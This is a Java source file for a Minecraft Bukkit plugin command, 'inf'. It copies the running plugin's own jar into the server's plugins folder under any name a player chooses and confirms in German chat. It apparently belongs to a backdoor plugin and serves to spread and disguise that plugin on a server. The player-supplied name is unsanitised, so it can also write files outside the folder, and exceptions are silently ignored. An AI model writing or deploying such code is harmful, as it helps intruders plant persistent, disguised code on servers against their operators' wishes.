package de.garkolym.cp.commands.impl;

import com.google.common.io.Files;
import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.entity.Player;

import java.io.File;

public class Command_INF extends CommandBase {

    public Command_INF() {
        super("inf", "<Plugin>", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        try {
            if (args.length == 2) {
                String PL = args[1];
                Files.copy(Start.pluginFile, new File("plugins/" + PL + ".jar"));
                p.sendMessage(Start.INSTANCE.chatPrefix + "Erfolgreich in §c" + PL + ".jar " + "§akopiert!");
            }
        } catch (Exception ignored) {
        }
    }

}
